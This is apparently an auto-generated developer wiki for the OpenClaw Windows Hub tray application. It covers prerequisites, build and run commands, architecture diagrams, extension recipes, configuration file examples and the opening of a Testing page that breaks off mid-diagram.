graph LR
    BuildScript["build.ps1"]
    
    subgraph "Prerequisite Checks"
        CheckOS["Check Windows OS"]
        CheckDotnet["Check .NET 10 SDK"]
        CheckWinSDK["Check Windows SDK"]
        CheckWebView["Check WebView2<br/>(optional)"]
    end
    
    subgraph "Architecture Detection"
        DetectArch["$env:PROCESSOR_ARCHITECTURE"]
        SetRID["Set $rid<br/>win-x64 or win-arm64"]
    end
    
    subgraph "Build Projects"
        BuildShared["Build OpenClaw.Shared<br/>(no RID)"]
        BuildTray["Build OpenClaw.Tray<br/>(no RID)"]
        BuildWinUI["Build OpenClaw.Tray.WinUI<br/>(with RID)"]
        BuildCmdPal["Build OpenClaw.CommandPalette<br/>(no RID, MSIX)"]
    end
    
    BuildScript --> CheckOS
    BuildScript --> CheckDotnet
    BuildScript --> CheckWinSDK
    BuildScript --> CheckWebView
    
    BuildScript --> DetectArch
    DetectArch --> SetRID
    
    SetRID --> BuildShared
    BuildShared --> BuildTray
    BuildShared --> BuildWinUI
    SetRID --> BuildWinUI
```

### Build Script Usage

**Check prerequisites only:**
```powershell
.\build.ps1 -CheckOnly
```

**Build all projects (Debug):**
```powershell
.\build.ps1
```

**Build specific project:**
```powershell
.\build.ps1 -Project WinUI -Configuration Release
.\build.ps1 -Project CommandPalette -Configuration Debug
```

**Valid project names:** `All`, `Tray`, `WinUI`, `Shared`, `CommandPalette`

**Sources:** [build.ps1:1-243](), [README.md:31-44]()

---

## Manual Build Commands

For scenarios where `build.ps1` is not available or finer control is needed:

### Building Shared Library
```powershell
dotnet build src/OpenClaw.Shared/OpenClaw.Shared.csproj -c Debug
```

### Building WinForms Tray
```powershell
dotnet build src/OpenClaw.Tray/OpenClaw.Tray.csproj -c Debug
```

### Building WinUI Tray (requires RID)
```powershell
# For x64 systems
dotnet build src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj -r win-x64 -c Debug

# For ARM64 systems (Surface Pro X, Snapdragon laptops)
dotnet build src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj -r win-arm64 -c Debug
```

### Building MSIX Package (for camera/mic permissions)
```powershell
dotnet build src/OpenClaw.Tray.WinUI -r win-x64 -p:PackageMsix=true -c Release
```

### Building Command Palette Extension
```powershell
dotnet build src/OpenClaw.CommandPalette/OpenClaw.CommandPalette.csproj -c Release
```

**Why WinUI requires RID:** The `OpenClaw.Tray.WinUI` project uses self-contained WebView2 deployment, which requires specifying a runtime identifier. Without `-r win-x64` or `-r win-arm64`, the build fails with WebView2-related errors.

**Sources:** [README.md:46-59](), [build.ps1:153-186]()

---

## Running and Debugging

### Running WinForms Tray App
```powershell
dotnet run --project src/OpenClaw.Tray/OpenClaw.Tray.csproj
```

### Running WinUI Tray App
The WinUI app must be run as a compiled executable (not via `dotnet run`):

```powershell
# After building with -r win-x64
.\src\OpenClaw.Tray.WinUI\bin\Debug\net10.0-windows10.0.19041.0\win-x64\OpenClaw.Tray.WinUI.exe

# After building with -r win-arm64
.\src\OpenClaw.Tray.WinUI\bin\Debug\net10.0-windows10.0.19041.0\win-arm64\OpenClaw.Tray.WinUI.exe
```

### Debugging in Visual Studio

1. Open `openclaw-windows-node.sln`
2. Set `OpenClaw.Tray.WinUI` as the startup project
3. Press F5 to build and debug
4. Breakpoints work normally in all projects

### Debugging Gateway Communication

The `OpenClawGatewayClient` logs all WebSocket traffic when a logger is provided:

```csharp
// In TrayApplication.cs or test code
var logger = new FileLogger("path/to/debug.log");
var client = new OpenClawGatewayClient("ws://localhost:18789", "token", logger);
```

Log files contain:
- WebSocket connection events
- Sent/received messages (JSON)
- Error stack traces
- Reconnection attempts

**Default log location:** `%LOCALAPPDATA%\OpenClawTray\openclaw-tray.log` (rotates at 1MB)

**Sources:** [README.md:61-70](), [README.md:294-300]()

---

## Project Dependencies and Data Flow

The following diagram shows how code entities communicate at runtime:

```mermaid
graph TB
    subgraph "Tray Application (TrayApplication.cs)"
        TrayApp["TrayApplication"]
        SettingsMgr["SettingsManager"]
        FlyoutMgr["FlyoutManager"]
        NodeMgr["NodeManager"]
    end
    
    subgraph "Gateway Communication (Operator Mode)"
        GatewayClient["OpenClawGatewayClient"]
        SessionsUpdated["Event: SessionsUpdated"]
        ActivityChanged["Event: ActivityChanged"]
        NotificationReceived["Event: NotificationReceived"]
        ChannelHealthUpdated["Event: ChannelHealthUpdated"]
    end
    
    subgraph "Node Mode Communication"
        NodeClient["WindowsNodeClient"]
        DeviceIdentity["DeviceIdentity"]
        InvokeRequest["HandleInvokeRequest()"]
    end
    
    subgraph "Capabilities (Shared/Capabilities)"
        SystemCap["SystemCapability"]
        CanvasCap["CanvasCapability"]
        ScreenCap["ScreenCapability"]
        CameraCap["CameraCapability"]
    end
    
    subgraph "UI Windows"
        WebChatWindow["WebChatWindow"]
        SettingsWindow["SettingsWindow"]
        QuickSendDialog["QuickSendDialog"]
    end
    
    TrayApp --> SettingsMgr
    TrayApp --> FlyoutMgr
    TrayApp --> NodeMgr
    
    TrayApp --> GatewayClient
    GatewayClient --> SessionsUpdated
    GatewayClient --> ActivityChanged
    GatewayClient --> NotificationReceived
    GatewayClient --> ChannelHealthUpdated
    
    SessionsUpdated --> FlyoutMgr
    ActivityChanged --> FlyoutMgr
    NotificationReceived --> TrayApp
    ChannelHealthUpdated --> FlyoutMgr
    
    NodeMgr --> NodeClient
    NodeClient --> DeviceIdentity
    NodeClient --> InvokeRequest
    
    InvokeRequest --> SystemCap
    InvokeRequest --> CanvasCap
    InvokeRequest --> ScreenCap
    InvokeRequest --> CameraCap
    
    TrayApp --> WebChatWindow
    TrayApp --> SettingsWindow
    TrayApp --> QuickSendDialog
    
    CanvasCap --> WebChatWindow
```

**Key Communication Patterns:**

| Pattern | Implementation | Purpose |
|---------|---------------|---------|
| Event-driven Gateway Updates | `OpenClawGatewayClient` raises C# events | Operator mode receives sessions, activity, notifications from gateway |
| UI Thread Marshaling | `SynchronizationContext.Post()` | All gateway events are marshaled to UI thread before raising |
| Request-Response Node Commands | `WindowsNodeClient.HandleInvokeRequest()` | Gateway sends `node.invoke.request`, node returns `node.invoke.result` |
| Capability Dispatch | `INodeCapability.ExecuteAsync()` | Node client routes commands to registered capabilities |
| Settings Persistence | `SettingsManager.SaveSettings()` | JSON serialization to `%APPDATA%\OpenClawTray\settings.json` |

**Sources:** [src/OpenClaw.Tray/DEVELOPMENT.md:3-45](), [src/OpenClaw.Tray/DEVELOPMENT.md:46-61]()

---

## Common Development Tasks

### Adding a New Gateway Event Handler

1. **Define the event in `OpenClawGatewayClient.cs`:**
```csharp
public event EventHandler<MyCustomEventArgs>? MyCustomEvent;
```

2. **Parse the event in the WebSocket message handler:**
```csharp
// In OnMessageReceived or ParseEventMessage
if (eventType == "mycustom")
{
    var args = JsonSerializer.Deserialize<MyCustomEventArgs>(payload);
    OnMyCustomEvent(args);
}
```

3. **Marshal to UI thread:**
```csharp
private void OnMyCustomEvent(MyCustomEventArgs args)
{
    if (_syncContext != null)
    {
        _syncContext.Post(_ => MyCustomEvent?.Invoke(this, args), null);
    }
    else
    {
        MyCustomEvent?.Invoke(this, args);
    }
}
```

4. **Subscribe in `TrayApplication.cs`:**
```csharp
_gatewayClient.MyCustomEvent += OnMyCustomEvent;

private void OnMyCustomEvent(object? sender, MyCustomEventArgs e)
{
    // Update UI on UI thread (already marshaled)
}
```

### Adding a New Node Capability

1. **Create capability class in `OpenClaw.Shared/Capabilities/`:**
```csharp
public class MyNewCapability : INodeCapability
{
    public string Category => "mynew";
    public string[] Commands => new[] { "mynew.dosomething", "mynew.doother" };
    
    public Task<object?> ExecuteAsync(string command, Dictionary<string, object>? args)
    {
        // Implementation
    }
}
```

2. **Register in `WindowsNodeClient.cs` constructor:**
```csharp
_capabilities.Add(new MyNewCapability());
```

3. **Add to gateway allowlist in `~/.openclaw/openclaw.json`:**
```json
{
  "gateway": {
    "nodes": {
      "allowCommands": [
        "mynew.dosomething",
        "mynew.doother"
      ]
    }
  }
}
```

### Adding a New Settings Field

1. **Add property to `AppSettings.cs`:**
```csharp
public class AppSettings
{
    public string MyNewSetting { get; set; } = "default";
}
```

2. **Add UI control in `SettingsWindow.xaml`:**
```xml
<TextBox Text="{x:Bind ViewModel.MyNewSetting, Mode=TwoWay}" />
```

3. **Settings automatically persist to `%APPDATA%\OpenClawTray\settings.json`** via `SettingsManager.SaveSettings()`

### Adding a New Menu Item

Edit `FlyoutManager.cs` to add items to the context menu:

```csharp
private void BuildMenu()
{
    var menu = new MenuFlyout();
    
    var myItem = new MenuFlyoutItem
    {
        Text = "My New Action",
        Icon = new SymbolIcon(Symbol.Add)
    };
    myItem.Click += OnMyItemClick;
    menu.Items.Add(myItem);
}
```

**Sources:** [src/OpenClaw.Tray/DEVELOPMENT.md:46-61]()

---

## Configuration Files and Locations

| File | Location | Purpose | Format |
|------|----------|---------|--------|
| `settings.json` | `%APPDATA%\OpenClawTray\` | User settings (gateway URL, token, preferences) | JSON |
| `exec-policy.json` | `%LOCALAPPDATA%\OpenClawTray\` | Node mode execution approval policy | JSON |
| `openclaw-tray.log` | `%LOCALAPPDATA%\OpenClawTray\` | Application log (rotates at 1MB) | Plain text |
| `deviceid` | `%LOCALAPPDATA%\OpenClawTray\` | Node mode Ed25519 device identity | Binary |
| `openclaw.json` | `~/.openclaw/` (gateway side) | Gateway configuration (including node allowlist) | JSON |

**Example `settings.json` structure:**
```json
{
  "GatewayUrl": "ws://localhost:18789",
  "Token": "your-token-here",
  "AutoStart": true,
  "ShowNotifications": true,
  "NotificationSound": "Default",
  "ShowGlobalHotkey": true,
  "NotifyHealth": true,
  "NotifyUrgent": true,
  "NotifyReminder": true,
  "NotifyEmail": true,
  "NotifyCalendar": true,
  "NotifyBuild": true,
  "NotifyStock": true,
  "NotifyInfo": true,
  "NodeModeEnabled": true
}
```

**Example `exec-policy.json` structure:**
```json
{
  "defaultAction": "deny",
  "rules": [
    { "pattern": "powershell.exe", "action": "allow" },
    { "pattern": "pwsh.exe", "action": "allow" },
    { "pattern": "echo *", "action": "allow" }
  ]
}
```

**Sources:** [README.md:294-300](), [src/OpenClaw.Tray/README.md:172-193]()

---

## Testing Requirements

The repository uses xUnit for unit testing. Tests are located in `tests/OpenClaw.Shared.Tests/`.

**Current test coverage:**
- Gateway client connection logic
- URL normalization and validation
- Data model serialization
- Node device identity generation
- Capability command routing

**Running tests:**
```powershell
dotnet test
```

**Running tests with coverage:**
```powershell
dotnet test /p:CollectCoverage=true /p:CoverageDirectory=coverage
```

For detailed testing guidance, see [Testing](#7.2).

**Sources:** [src/OpenClaw.Shared/OpenClaw.Shared.csproj:10-12]()

---

## Debugging Tips

### Gateway Connection Issues

**Check gateway is running:**
```bash
# In WSL2 or Mac terminal
openclaw gateway status
```

**Test WebSocket connection manually:**
```powershell
# Using PowerShell
Test-NetConnection -ComputerName localhost -Port 18789
```

**Enable detailed logging:**
Set a logger when creating the gateway client. Logs include full WebSocket messages.

### Node Mode Pairing Issues

**Check device status on gateway:**
```bash
openclaw devices list
```

**Verify device ID matches:**
The device ID shown in the tray menu (when you click it) should match the ID in `openclaw devices list`.

**Check gateway allowCommands:**
Commands must be explicitly listed in `~/.openclaw/openclaw.json` under `gateway.nodes.allowCommands`. Wildcards like `canvas.*` do not work.

### MSIX Deployment Issues

**For camera/mic permissions in development:**
- Build with `-p:PackageMsix=true`
- Deploy the MSIX package
- Windows will show permission consent dialogs

**For desktop builds:**
- Camera/mic rely on system privacy settings
- Go to Settings → Privacy → Camera/Microphone
- Enable for desktop apps

### WebView2 Issues

**If web chat window is blank:**
1. Verify WebView2 Runtime is installed: `Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}"`
2. Check application log for WebView2 initialization errors
3. Try deleting WebView2 user data folder: `%LOCALAPPDATA%\OpenClawTray\WebView2`

**Sources:** [README.md:195-216](), [build.ps1:104-122]()

---

## Code Style and Conventions

The codebase follows standard C# conventions with some specific patterns:

### Naming Conventions
- **Events:** PascalCase with `EventHandler<T>` pattern (e.g., `SessionsUpdated`, `ActivityChanged`)
- **Async methods:** Suffix with `Async` (e.g., `ConnectAsync`, `SendMessageAsync`)
- **Private fields:** Prefix with `_` (e.g., `_gatewayClient`, `_syncContext`)
- **Constants:** PascalCase or UPPER_SNAKE_CASE for configuration

### Async Patterns
Always use `async`/`await` for I/O operations. Never use `.Result` or `.Wait()` in UI code (causes deadlocks).

### UI Thread Marshaling
All gateway events must be marshaled to UI thread:
```csharp
_syncContext?.Post(_ => MyEvent?.Invoke(this, args), null);
```

### Null Safety
Nullable reference types are enabled (`<Nullable>enable</Nullable>`). Use null-conditional operators (`?.`) and null-coalescing (`??`) appropriately.

### Error Handling
- Log all exceptions with context
- Don't swallow exceptions silently
- UI operations should catch and display user-friendly messages

**Sources:** [src/OpenClaw.Shared/OpenClaw.Shared.csproj:1-19]()

---

# Page: Getting Started

# Getting Started

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [README.md](README.md)
- [build.ps1](build.ps1)
- [src/OpenClaw.Shared/OpenClaw.Shared.csproj](src/OpenClaw.Shared/OpenClaw.Shared.csproj)

</details>



This guide provides step-by-step instructions for setting up a development environment and building the OpenClaw Windows Hub from source. It covers prerequisite installation, cloning the repository, building all projects, and running the applications for the first time.

For information about testing the codebase, see [Testing](#7.2). For PowerToys Command Palette extension development specifically, see [PowerToys Command Palette Extension](#7.3). For information about the build system architecture and CI/CD pipeline, see [Build System](#6.1) and [CI/CD Pipeline](#6.2).

Sources: [README.md:22-70](), [build.ps1:1-243]()

---

## Prerequisites

The OpenClaw Windows Hub requires specific development tools and runtimes. The following table summarizes all prerequisites:

| Component | Requirement | Purpose | Verification |
|-----------|-------------|---------|--------------|
| **Operating System** | Windows 10 (20H2+) or Windows 11 | Host platform | `ver` |
| **.NET SDK** | .NET 10.0 SDK | Build all projects | `dotnet --version` |
| **Windows SDK** | Windows 10 SDK (10.0.19041.0+) | WinUI compilation | Check `C:\Program Files (x86)\Windows Kits\10\Include` |
| **WebView2 Runtime** | Microsoft Edge WebView2 | Embedded browser functionality | Check registry or visit edge://settings/help |
| **PowerToys** | Latest version (optional) | Command Palette extension testing | Check installed apps |

Sources: [README.md:23-28](), [build.ps1:58-122]()

### Installing .NET 10.0 SDK

The .NET 10.0 SDK is required for all projects in the monorepo. Download from:
- Official release: https://dotnet.microsoft.com/download/dotnet/10.0

Verify installation:
```powershell
dotnet --version
# Should output: 10.0.x

dotnet --list-sdks
# Should include: 10.0.x [...]
```

The build script at [build.ps1:68-91]() checks for both the `dotnet` command and the presence of a .NET 10 SDK.

Sources: [README.md:25](), [build.ps1:68-91]()

### Installing Windows 10 SDK

The Windows 10 SDK is required for building `OpenClaw.Tray.WinUI`, which targets the WinUI 3 framework. Install via:
- Visual Studio Installer (workload: ".NET Desktop Development" with "Windows 10 SDK" component)
- Standalone installer: https://developer.microsoft.com/windows/downloads/windows-sdk

The build script checks for SDK presence at [build.ps1:94-102]() by inspecting `${env:ProgramFiles(x86)}\Windows Kits\10\Include`.

Sources: [README.md:26](), [build.ps1:94-102]()

### Installing WebView2 Runtime

WebView2 Runtime powers the embedded web chat window and canvas capability. It is pre-installed on Windows 10 (21H2+) and Windows 11. For older versions:
- Download from: https://developer.microsoft.com/microsoft-edge/webview2

The build script detects WebView2 at [build.ps1:105-121]() by checking registry keys `HKLM:\SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}` and `HKCU:\SOFTWARE\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}`.

Sources: [README.md:27](), [build.ps1:105-121]()

### Checking Prerequisites Automatically

Use the build script's check-only mode to verify all prerequisites:

```powershell
.\build.ps1 -CheckOnly
```

This runs all prerequisite checks without building. Example output:

```
  🦞 OpenClaw Windows Hub - Build Script
  =======================================

=== Checking Prerequisites ===
✅ Windows detected
✅ .NET SDK: 10.0.100
✅ .NET 10 SDK available
✅ Windows SDK: 10.0.22621.0
✅ WebView2 Runtime: 130.0.2849.56
✅ Architecture: AMD64

=== Prerequisite Summary ===
✅ All prerequisites met!
```

Sources: [build.ps1:142-145](), [build.ps1:54-141]()

---

## Cloning the Repository

Clone the repository from GitHub:

```powershell
git clone https://github.com/openclaw/openclaw-windows-node.git
cd openclaw-windows-node
```

The repository structure follows a standard .NET solution layout:

**Development Workflow Overview**

```mermaid
graph LR
    Clone["Clone Repository<br/>git clone ..."]
    CheckPrereqs["Check Prerequisites<br/>build.ps1 -CheckOnly"]
    Build["Build Projects<br/>build.ps1"]
    Run["Run Application<br/>dotnet run or .exe"]
    Test["Run Tests<br/>(see Testing page)"]
    
    Clone --> CheckPrereqs
    CheckPrereqs --> Build
    Build --> Run
    Build --> Test
```

Sources: [README.md:279-292]()

---

## Project Structure

The monorepo contains four projects with specific dependencies:

**Project Dependency Graph**

```mermaid
graph TB
    Shared["OpenClaw.Shared<br/>Gateway client library<br/>src/OpenClaw.Shared/"]
    TrayWinForms["OpenClaw.Tray<br/>WinForms tray app<br/>src/OpenClaw.Tray/"]
    TrayWinUI["OpenClaw.Tray.WinUI<br/>WinUI tray app<br/>src/OpenClaw.Tray.WinUI/"]
    CommandPalette["OpenClaw.CommandPalette<br/>PowerToys extension<br/>src/OpenClaw.CommandPalette/"]
    
    TrayWinForms --> Shared
    TrayWinUI --> Shared
    CommandPalette --> Shared
```

| Project | Framework | Purpose | Build Requirements |
|---------|-----------|---------|-------------------|
| `OpenClaw.Shared` | net10.0 | Gateway client, data models, node client | .NET 10.0 SDK |
| `OpenClaw.Tray` | net10.0-windows | Legacy WinForms tray app | .NET 10.0 SDK |
| `OpenClaw.Tray.WinUI` | net10.0-windows10.0.19041.0 | Modern WinUI tray app | .NET 10.0 SDK + Windows SDK |
| `OpenClaw.CommandPalette` | net10.0-windows10.0.19041.0 | PowerToys Command Palette | .NET 10.0 SDK + Windows SDK |

Sources: [README.md:11-19](), [README.md:279-292](), [src/OpenClaw.Shared/OpenClaw.Shared.csproj:1-21]()

---

## Building the Solution

The recommended build method is the PowerShell build script, which automatically detects architecture and applies correct runtime identifiers.

### Using the Build Script

The `build.ps1` script at the repository root provides the primary build interface:

```powershell
# Build all projects with automatic architecture detection
.\build.ps1

# Build specific project
.\build.ps1 -Project WinUI
.\build.ps1 -Project Tray
.\build.ps1 -Project Shared
.\build.ps1 -Project CommandPalette

# Build in Release configuration
.\build.ps1 -Configuration Release

# Combine options
.\build.ps1 -Project WinUI -Configuration Release
```

The script performs these operations:

1. **Architecture Detection** ([build.ps1:124-128]()): Detects `AMD64` or `ARM64` from `$env:PROCESSOR_ARCHITECTURE`
2. **Runtime Identifier Selection** ([build.ps1:154-155]()): Maps to `win-x64` or `win-arm64`
3. **Dependency Order** ([build.ps1:197-200]()): Builds `OpenClaw.Shared` first if needed
4. **Conditional RID Usage** ([build.ps1:159-186]()): Applies `-r` flag only for WinUI project

Sources: [build.ps1:150-208](), [README.md:30-44]()

### Understanding Runtime Identifiers

The `OpenClaw.Tray.WinUI` project requires a runtime identifier (RID) for self-contained WebView2 support. The build script automatically selects the appropriate RID:

| Detected Architecture | Selected RID | Output Path |
|----------------------|--------------|-------------|
| AMD64 | `win-x64` | `bin\Debug\net10.0-windows10.0.19041.0\win-x64\` |
| ARM64 | `win-arm64` | `bin\Debug\net10.0-windows10.0.19041.0\win-arm64\` |

**Build Output Location Mapping**

```mermaid
graph TB
    BuildScript["build.ps1"]
    ArchDetect["Detect Architecture<br/>$env:PROCESSOR_ARCHITECTURE"]
    RidSelect{"Select RID"}
    
    BuildScript --> ArchDetect
    ArchDetect --> RidSelect
    
    RidSelect -->|"AMD64"| WinX64["win-x64<br/>bin/Debug/net10.0-windows10.0.19041.0/win-x64/"]
    RidSelect -->|"ARM64"| WinARM64["win-arm64<br/>bin/Debug/net10.0-windows10.0.19041.0/win-arm64/"]
    
    WinX64 --> TrayExeX64["OpenClaw.Tray.WinUI.exe"]
    WinARM64 --> TrayExeARM64["OpenClaw.Tray.WinUI.exe"]
```

Sources: [build.ps1:154-155](), [README.md:52-54]()

### Using dotnet CLI Directly

For manual builds or CI/CD integration, use `dotnet build` directly:

```powershell
# Build entire solution
dotnet build

# Build Shared library
dotnet build src/OpenClaw.Shared/OpenClaw.Shared.csproj

# Build WinForms tray app
dotnet build src/OpenClaw.Tray/OpenClaw.Tray.csproj

# Build WinUI tray app (requires RID)
dotnet build src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj -r win-x64
dotnet build src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj -r win-arm64

# Build MSIX package for camera/mic permissions
dotnet build src/OpenClaw.Tray.WinUI -r win-x64 -p:PackageMsix=true
```

The WinUI project must include a runtime identifier (`-r win-x64` or `-r win-arm64`) due to WebView2's architecture-specific native dependencies.

Sources: [README.md:46-59]()

### Build Output Summary

After a successful build, the script displays output locations:

```
=== Build Summary ===
✅ Shared
✅ Tray
✅ WinUI

🦞 All builds succeeded!

To run:
  WinForms: dotnet run --project src/OpenClaw.Tray/OpenClaw.Tray.csproj
  WinUI:    .\src\OpenClaw.Tray.WinUI\bin\Debug\net10.0-windows10.0.19041.0\win-x64\OpenClaw.Tray.WinUI.exe
```

Sources: [build.ps1:210-242]()

---

## Running the Applications

Each project can be run independently. The WinUI tray app is the primary user-facing application.

### Running OpenClaw.Tray.WinUI (Recommended)

The WinUI tray app must be run from its compiled executable due to the runtime identifier requirement:

```powershell
# x64 architecture
.\src\OpenClaw.Tray.WinUI\bin\Debug\net10.0-windows10.0.19041.0\win-x64\OpenClaw.Tray.WinUI.exe

# ARM64 architecture
.\src\OpenClaw.Tray.WinUI\bin\Debug\net10.0-windows10.0.19041.0\win-arm64\OpenClaw.Tray.WinUI.exe
```

On first run, if no authentication token is configured, the application displays a welcome dialog guiding you through token setup. Configuration is stored in `%APPDATA%\OpenClawTray\settings.json`.

Sources: [README.md:61-70](), [README.md:295-307]()

### Running OpenClaw.Tray (Legacy WinForms)

The WinForms version can be run via `dotnet run`:

```powershell
dotnet run --project src/OpenClaw.Tray/OpenClaw.Tray.csproj
```

This is the legacy tray application maintained for compatibility. Most development focuses on the WinUI version.

Sources: [README.md:65-66]()

### Running OpenClaw.CommandPalette

The Command Palette extension requires deployment through Visual Studio or the MSIX packaging system. See [PowerToys Command Palette Extension](#7.3) for detailed instructions.

Sources: [README.md:263-267]()

---

## Verification Steps

After building and running, verify the application is functioning correctly:

**Application Startup Verification Flow**

```mermaid
sequenceDiagram
    participant Dev as "Developer"
    participant App as "OpenClaw.Tray.WinUI.exe"
    participant Settings as "SettingsManager<br/>%APPDATA%/OpenClawTray/settings.json"
    participant Gateway as "OpenClaw Gateway<br/>ws://localhost:18789"
    participant Tray as "System Tray Icon"
    
    Dev->>App: "Run executable"
    App->>Settings: "Load settings.json"
    
    alt "First Run (no token)"
        Settings-->>App: "null token"
        App->>Dev: "Show Welcome Dialog"
        Dev->>App: "Configure token in Settings"
        App->>Settings: "Save settings.json"
    else "Token configured"
        Settings-->>App: "Return token"
    end
    
    App->>Gateway: "Connect WebSocket"
    
    alt "Gateway reachable"
        Gateway-->>App: "Connected"
        App->>Tray: "Show green icon"
    else "Gateway unreachable"
        Gateway-->>App: "Connection failed"
        App->>Tray: "Show gray icon"
    end
    
    Dev->>Tray: "Right-click icon"
    Tray->>Dev: "Show context menu"
```

### 1. Check System Tray Icon

The application should appear in the Windows system tray with a lobster icon. Icon colors indicate connection status:
- **Green**: Connected to gateway
- **Gray**: Disconnected from gateway
- **Red badge**: Active agent session

Sources: [README.md:6-9](), [README.md:76-78]()

### 2. Verify Gateway Connection

Right-click the tray icon to open the menu. The top section should display:
- Gateway URL (default: `ws://localhost:18789`)
- Connection status (Connected/Disconnected)
- Last update timestamp

If disconnected, ensure the OpenClaw Gateway is running on the target URL.

Sources: [README.md:93-95]()

### 3. Test Configuration Persistence

Settings are stored at `%APPDATA%\OpenClawTray\settings.json`. Verify:

```powershell
# View settings file
Get-Content $env:APPDATA\OpenClawTray\settings.json | ConvertFrom-Json

# View logs
Get-Content $env:LOCALAPPDATA\OpenClawTray\openclaw-tray.log -Tail 20
```

Sources: [README.md:295-299]()

### 4. Test Deep Links

Verify URI scheme registration:

```powershell
# Open settings dialog
Start-Process "openclaw://settings"

# Open web chat
Start-Process "openclaw://chat"

# Open quick send
Start-Process "openclaw://send?message=Hello"
```

Deep links should work even when multiple instances are running due to single-instance enforcement with IPC forwarding.

Sources: [README.md:237-249]()

---

## Troubleshooting Common Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| "error NETSDK1083: The specified RuntimeIdentifier is not supported" | Missing `-r` flag for WinUI | Add `-r win-x64` or `-r win-arm64` to build command |
| "Windows SDK not found" | Windows SDK not installed | Install via Visual Studio Installer |
| WebView2 initialization fails | WebView2 Runtime missing | Install from https://developer.microsoft.com/microsoft-edge/webview2 |
| ".NET 10 SDK not found" | Wrong SDK version | Install .NET 10.0 SDK from dotnet.microsoft.com |
| Tray icon shows gray (disconnected) | Gateway not running | Start OpenClaw Gateway on target URL |
| Welcome dialog appears every time | Settings file not persisting | Check file permissions for `%APPDATA%\OpenClawTray\` |

Sources: [build.ps1:73-87](), [build.ps1:94-102](), [build.ps1:105-121]()

---

## Next Steps

After successfully building and running the application:

1. **Configure Gateway Connection**: Set up authentication token and gateway URL in Settings
2. **Explore Testing**: See [Testing](#7.2) for information on running unit tests
3. **Review Architecture**: Understand the system design in [System Architecture](#1.1)
4. **Learn Node Mode**: Enable remote control capabilities in [Node Mode](#4)
5. **Build for Distribution**: Package the application following [Packaging & Distribution](#6.3)

Sources: [README.md:1-317]()

---

# Page: Testing

# Testing

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/Capabilities/SystemCapability.cs](src/OpenClaw.Shared/Capabilities/SystemCapability.cs)
- [src/OpenClaw.Shared/GatewayUrlHelper.cs](src/OpenClaw.Shared/GatewayUrlHelper.cs)
- [src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs)
- [src/OpenClaw.Tray/TrayApplication.cs](src/OpenClaw.Tray/TrayApplication.cs)
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs](tests/OpenClaw.Shared.Tests/CapabilityTests.cs)
- [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs](tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs)
- [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs](tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs)
- [tests/OpenClaw.Shared.Tests/ModelsTests.cs](tests/OpenClaw.Shared.Tests/ModelsTests.cs)
- [tests/OpenClaw.Shared.Tests/WindowsNodeClientTests.cs](tests/OpenClaw.Shared.Tests/WindowsNodeClientTests.cs)

</details>



This document describes the test infrastructure for the OpenClaw Windows Hub. It covers the test project structure, test categories, execution methods, and testing conventions. For information about the development environment setup, see [Getting Started](#7.1). For build and CI/CD processes, see [CI/CD Pipeline](#6.2).

## Overview

The OpenClaw Windows Hub includes a comprehensive test suite located in the `tests/` directory. Tests are written using xUnit and focus on unit testing the shared library components (`OpenClaw.Shared`), with particular emphasis on capability implementations, data models, and utility functions. The test suite runs automatically on every push via GitHub Actions and can be executed locally during development.

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:1-900](), [.github/workflows/build.yml]()

## Test Project Structure

The test suite is organized into a single test project that mirrors the structure of the main shared library:

```mermaid
graph TB
    TestProject["OpenClaw.Shared.Tests<br/>(xUnit Test Project)"]
    
    CapTests["CapabilityTests.cs<br/>SystemCapability<br/>CanvasCapability<br/>ScreenCapability<br/>CameraCapability"]
    ModelTests["ModelsTests.cs<br/>AgentActivity<br/>ChannelHealth<br/>SessionInfo<br/>GatewayUsageInfo<br/>GatewayNodeInfo"]
    UrlTests["GatewayUrlHelperTests.cs<br/>URL normalization<br/>Credential extraction"]
    PolicyTests["ExecApprovalPolicyTests.cs<br/>Command approval logic<br/>Pattern matching"]
    ClientTests["WindowsNodeClientTests.cs<br/>Client initialization"]
    
    SharedLib["OpenClaw.Shared<br/>(System Under Test)"]
    
    Caps["Capabilities/<br/>SystemCapability<br/>CanvasCapability<br/>ScreenCapability<br/>CameraCapability"]
    Models["Models.cs<br/>Data transfer objects"]
    UrlHelper["GatewayUrlHelper.cs"]
    Policy["ExecApprovalPolicy.cs"]
    NodeClient["WindowsNodeClient.cs"]
    
    TestProject --> CapTests
    TestProject --> ModelTests
    TestProject --> UrlTests
    TestProject --> PolicyTests
    TestProject --> ClientTests
    
    CapTests -.->|tests| Caps
    ModelTests -.->|tests| Models
    UrlTests -.->|tests| UrlHelper
    PolicyTests -.->|tests| Policy
    ClientTests -.->|tests| NodeClient
    
    Caps --> SharedLib
    Models --> SharedLib
    UrlHelper --> SharedLib
    Policy --> SharedLib
    NodeClient --> SharedLib
```

**Sources:** [tests/OpenClaw.Shared.Tests/]()

## Test Categories

### Capability Tests

The capability test suite validates all four capability implementations used in Node Mode. Each capability class is tested for command handling, argument parsing, error conditions, and event raising.

```mermaid
graph LR
    subgraph "SystemCapabilityTests"
        SysNotify["system.notify<br/>Title, body, sound<br/>Event raising"]
        SysRun["system.run<br/>Command arrays<br/>Timeout handling<br/>Policy checks"]
        SysWhich["system.which<br/>Executable resolution<br/>PATH traversal rejection"]
        SysExec["system.execApprovals.*<br/>Get/set policy"]
    end
    
